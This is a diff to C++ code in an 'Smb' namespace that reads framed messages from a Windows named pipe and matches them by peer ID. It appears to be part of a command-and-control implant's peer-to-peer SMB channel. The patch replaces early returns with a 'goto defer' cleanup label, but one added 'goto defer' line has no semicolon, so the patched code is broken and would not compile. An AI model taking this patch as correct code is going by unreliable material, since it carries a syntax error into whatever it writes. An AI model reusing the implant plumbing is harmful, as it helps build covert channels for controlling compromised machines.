@@ -385,10 +385,12 @@ namespace Smb {
         _stream search  = { };
         int32_t current = 0;
         uint32_t read   = 0;
+        bool success = true;
 
         while (true) {
             if (!Ctx->win32.PeekNamedPipe(handle, &search, 0x10, R_CAST(LPDWORD, &read), nullptr, nullptr) || read < 0x10) {
-                return false;
+                success = false;
+                goto defer;
             }
 
             if (search.peer_id == Ctx->session.peer_id) {
@@ -398,13 +400,17 @@ namespace Smb {
                 Ctx->win32.SetFilePointer(handle, current, nullptr, FILE_BEGIN);
             } else {
                 x_memcpy(&stream , &search, 0x10);
-                return true;
+                goto defer
             }
 
             if (current >= read) {
-                return false;
+                success = false;
+                goto defer;
             }
         }
+
+        defer:
+        return success;
     }
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
